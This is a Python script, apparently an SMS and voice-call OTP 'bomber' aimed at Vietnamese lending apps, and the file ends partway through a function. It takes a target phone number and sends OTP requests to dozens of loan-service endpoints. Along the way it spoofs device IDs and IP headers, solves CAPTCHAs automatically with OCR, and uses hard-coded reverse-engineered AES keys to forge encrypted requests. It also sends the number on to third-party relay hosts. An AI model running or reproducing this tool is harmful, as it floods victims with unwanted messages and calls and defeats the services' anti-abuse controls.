    
import sys
import asyncio
import random
import sys
import os
import secrets
import random
import httpx
import asyncio
import time
import gc
import uuid
import hashlib
from datetime import datetime, timedelta
import json
import base64
import io
from typing import Optional, Dict, Tuple
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image
import ddddocr
ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr = ddddocr.DdddOcr(show_ad=False)

def build_headers(origin, mode="ios"):
    devices = [
        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro",
        "Redmi K70", "POCO X6 Pro",
        "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
        "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
        "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
        "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
        "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
    ]
    android_versions = ["11", "12", "13", "14", "15"]
    device = random.choice(devices)
    return {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
        "content-type": "application/json",
        "x-client-type": "phone",
        "origin": origin,
        "referer": origin + "/",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip"
    }

def _random_android_id() -> str:
    return ''.join(random.choices('0123456789abcdef', k=32))

def gen_device_id():
    return str(uuid.uuid4()).upper()

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_random_ipv6():
    parts = []
    for _ in range(8):
        part = format(random.randint(0, 65535), 'x')
        parts.append(part)
    return ':'.join(parts)

_VNCREDIT_KEY = b'tdbdif7653scbvy4'

def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(',', ':')).encode()
    cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
    enc = base64.b64encode(cipher.encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}

def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
        return json.loads(unpad(cipher.decrypt(raw), 16).decode())
    except Exception:
        return resp_json

_VNCREDIT_DEVICE_IDS: dict = {}

def _vncredit_device_id(phone_otp: str) -> str:
    if phone_otp not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone_otp] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone_otp]

_QQ_BASE      = "https://ang.quickquangapp.com"
_QQ_OWNERSHIP = "quiquang_ios"

def _qq_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _QQ_OWNERSHIP,
        "Origin":        _QQ_BASE,
        "Referer":       _QQ_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _qq_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.1.0",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _QQ_OWNERSHIP,
        "token":           "",
        **extra,
    }

def _qq_solve(b64_str: str) -> str:
    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        buf_color = io.BytesIO()
        img.convert("RGB").save(buf_color, format="PNG")
        result = _ocr.classification(buf_color.getvalue())
        if result and result.strip():
            return result.strip()
        from PIL import ImageEnhance
        enhanced = ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0)
        buf_enh = io.BytesIO()
        enhanced.save(buf_enh, format="PNG")
        result2 = _ocr.classification(buf_enh.getvalue())
        return result2.strip() if result2 else ""
    except Exception:
        return ""

async def _qq_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                return
            r2 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        pass

async def qq_sms(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")

async def qq_voice(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getVoiceCode", "QQ Voice")

_PTV_BASE      = "https://app.phuthinhvay.com"
_PTV_OWNERSHIP = "PTVayNhanh_ios"

def _ptv_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encrypttype":   "0",
        "disturbedurl":  "0",
        "disturbedpar":  "0",
        "ownership":     _PTV_OWNERSHIP,
        "User-Agent":    "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _ptv_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _PTV_OWNERSHIP,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        "phoneNo":     phone_otp,
        **extra,
    }

async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                return
            r2 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        pass

async def ptvay_sms(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")

async def ptvay_voice(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/getVoiceCode", "captcha", "PTVay Voice")

_LAVI_BASE      = "http://tin.lavifinancecompany.com"
_LAVI_OWNERSHIP = "laviFinance_ios"

def _lavi_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "ownerShip":     _LAVI_OWNERSHIP,
        "User-Agent":    "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _lavi_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _LAVI_OWNERSHIP,
        "phoneNo":     phone_otp,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        **extra,
    }

async def _lavi_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                return
            r2 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        pass

async def lavi_sms(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")

async def lavi_voice(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getVoiceCode", "Lavi Voice")

_ACHAU_BASE      = "https://tien.achauloan.com"
_ACHAU_OWNERSHIP = "AChauLoan_ios"

def _achau_headers() -> dict:
    return {
        "Accept":          "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type":    "application/json",
        "Connection":      "keep-alive",
        "User-Agent":      "vetnam_xingxing_01/5 CFNetwork/1568.200.51 Darwin/24.1.0",
        "disturbedurl":    "0",
        "encrypttype":     "1",
        "encrypted":       "0",
        "disturbedpar":    "1",
        "ownership":       _ACHAU_OWNERSHIP,
    }

def _achau_body(phone_otp: str, extra: dict) -> dict:
    return {
        "reqSource":      "Ios",
        "phoneName":      "iPhone",
        "appVersion":     "1.2.8",
        "androidversion": "iOS 18.1",
        "deviceID":       str(uuid.uuid4()).upper(),
        "i18n":           "zh_CN",
        "phoneNo":        phone_otp,
        "veriType":       "LOGIN",
        **extra,
    }

async def _achau_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                return
            r2 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        pass

async def achau_sms(phone_otp: str):
    await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")

_HTC_BASE      = "https://tin.hatacocompany.com"
_HTC_OWNERSHIP = "hatacovay_ios"

def _htc_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _HTC_OWNERSHIP,
        "Origin":        _HTC_BASE,
        "Referer":       _HTC_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _htc_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.0.2",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _HTC_OWNERSHIP,
        "token":           "",
        **extra,
    }

async def _htc_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                return
            r2 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        pass

async def htc_sms(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getSMSCode", "HTC SMS")

async def htc_voice(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getVoiceCode", "HTC Voice")

_PETRO_BASE      = "https://loan.gpamcloan.com"
_PETRO_OWNERSHIP = "GPAMCloan_ios"

def _petro_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _PETRO_OWNERSHIP,
        "Origin":        _PETRO_BASE,
        "Referer":       _PETRO_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _petro_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":              "vi_VN",
        "reqSource":         "Ios",
        "phoneName":         "iPhone13,3",
        "appVersion":        "1.1.0",
        "androidversion":    "iOS18.1",
        "webVersion":        "1.0.0",
        "deviceID":          str(uuid.uuid4()).upper(),
        "uuid":              uuid.uuid4().hex,
        "pagingData":        0,
        "phoneNo":           phone_otp,
        "exquisiteItemType": 1,
        "ownerShip":         _PETRO_OWNERSHIP,
        "token":             "",
        **extra,
    }

async def _petro_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True, http2=True) as c:
            r1 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False})
            )
            try:
                d1 = r1.json()
            except Exception:
                print(f" ✘ {label} invalid json #1")
                return

            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp} {d1.get('message', '')}")
                return

            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} no captcha")
                return

            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} captcha solve fail")
                return

            r2 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer})
            )

            try:
                d2 = r2.json()
            except Exception:
                print(f" ✘ {label} invalid json #2")
                return

            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp} [{answer}] {d2.get('message', '')}")
            else:
                print(f" ✘ {label} {phone_otp} [{answer}] {d2}")
    except Exception as e:
        print(f" ✘ {label} {phone_otp} {type(e).__name__}: {e}")

async def petro_sms(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getSMSCode", "Petro SMS")

async def petro_voice(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getVoiceCode", "Petro Voice")

def _vncredit_headers(phone_otp: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone_otp),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }

async def vncredit_sms(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit SMS  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def vncredit_voice(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit Voice  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def random_site(phone_otp):
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://doaxa--e3c9c6644c9c11f1b16dee650bb23af1.web.val.run",
            headers={"Content-Type": "application/json"},
            json={"phone": phone_otp}
        )

async def call_mfast360(phone_otp):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    }
    payload = {
        "mobile_phone": phone_otp,
        "type": "call",
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
                json=payload,
                headers=headers,
            )
        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
    except:
        pass

async def call_vaydep365(phone_otp: str):
    CF_URL = [
        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
        "https://verceldeploy-one-phi.vercel.app/api/vaydep",
    ]
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                random.choice(CF_URL),
                json={"phone": phone_otp},
            )
        print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
        return r.json()
    except Exception as e:
        return None

async def call_senvay(phone_otp):
    KEY   = b"43frgy5fmjf4647f"
    NONCE = b"\x00" * 12

    def enc(plain):
        if isinstance(plain, (dict, list)):
            plain = json.dumps(plain, separators=(",", ":")).encode()
        elif isinstance(plain, str):
            plain = plain.encode()
        ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=NONCE).encrypt_and_digest(plain)
        return base64.b64encode(NONCE + ct + tag).decode()

    def make_token(device_no: str, server_time_ms: int) -> str:
        inner_token = enc(f"{device_no}++1")
        return enc(f"{inner_token}+{server_time_ms}")

    def make_headers(token: str) -> dict:
        return {
            "Accept":          "application/json, text/plain, */*",
            "Content-Type":    "application/json",
            "version":         "1.0.0",
            "countryCode":     "vn",
            "type":            "1060",
            "token":           token,
            "Origin":          "https://senvayvaytien.com",
            "Referer":         "https://senvayvaytien.com/login",
            "User-Agent":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
        }

    device_no = str(uuid.uuid4())
    base_url  = "https://senvayvaytien.com/ly03"
    try:
        async with httpx.AsyncClient(verify=False, timeout=30) as client:
            init_path  = "/encrypt/k/bla/j"
            init_param = {
                "fndkec": "vn",
                "ffkjno": "1060",
                "fniehh": "1.0.0",
                "falgnk": 1,
                "fajnpo": "",
                "fnjhhd": device_no,
            }
            local_before  = int(time.time() * 1000)
            init_token    = make_token(device_no, local_before)
            init_body     = enc({"param": enc(init_param), "url": enc(init_path)})
            r = await client.post(
                f"{base_url}{init_path}",
                content=init_body.encode(),
                headers=make_headers(init_token),
            )
            server_time_ms = local_before
            if r.status_code == 200:
                try:
                    init_data = r.json()
                    result    = init_data.get("result") or {}
                    sv = result.get("ffolml")
                    if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
                        server_time_ms = int(sv)
                except Exception:
                    pass
            sms_path  = "/fm/nkgg/edf"
            phone_fmt = "840" + phone_otp.lstrip("0")
            sms_param = {
                "ffchmk": "vn",
                "fahpgp": "1060",
                "fmland": "1.0.0",
                "fbdcbg": phone_fmt,
                "fpkgam": 2,
                "fojphg": 1,
            }
            sms_token = make_token(device_no, server_time_ms)
            sms_body  = enc({"param": enc(sms_param), "url": enc(sms_path)})
            r = await client.post(
                f"{base_url}{sms_path}",
                content=sms_body.encode(),
                headers=make_headers(sms_token),
            )

        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
        return r.status_code == 200
    except Exception as e:
        print(f"❌ error: {e}")
        return False

async def call1(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://ezvay.com",
            "Referer": "https://ezvay.com/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "vay_home"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://ezvay.com/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "vay_home"
            }
            r2 = await client.post(
                "https://ezvay.com/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )
        print(f"📡 Status: {r1.status_code} | {r1.text[:160]}")
        return True
    except:
        return False

async def call2(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://vaycash.top",
            "Referer": "https://vaycash.top/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "u_cash"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://vaycash.top/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "u_cash"
            }
            r2 = await client.post(
                "https://vaycash.top/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )
        print(f"📡 Status: {r1.status_code} | {r1.text[:160]}")
        return True
    except:
        return False

async def call3(phone_otp):
    phone_formatted = phone_otp.lstrip('0')
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted,
        "type": "2",
        "chntoken": "",
        "sourse": "1",
        "ip2": get_random_ip(),
        "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
    except:
        return False

async def call9(phone_otp):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp_get = await client.get(
                "https://lk.vayxanh.com/",
                params={"phone": phone_otp, "amount": "2000000", "term": "7",
                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
                headers=headers_get,
            )
            r = await client.post(
                "https://lk.vayxanh.com/api/4/client/otp/send",
                headers=headers_post,
                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
            )
        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
    except:
        return False

async def call_hoivan(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "app_id": "247000001"},
            headers=headers,
        )

async def call_hoivan_alt(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "247000000"},
            headers=headers,
        )

async def mfast(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mfast.vn",
        "Referer": "https://mfast.vn/",
        "language": "vi_VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone_otp,
        "type": "phone",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://appay-rc.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
            headers=headers,
            data=data,
        )
    print(f"📡 Status: {r.status_code} | {r.text[:160]}")

async def combo1(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload1 = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "ios",
        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload1,
            headers=headers
        )
    print(f"📡 Status: {r.status_code} | {r.text[:160]}")

async def combo2(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            headers=headers,
            json=payload
        )
    print(f"📡 Status: {r.status_code} | {r.text[:160]}")

async def call8(phone_otp):
    headers = build_headers("https://ios-h5.marttimeassrt.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Mar Vay",
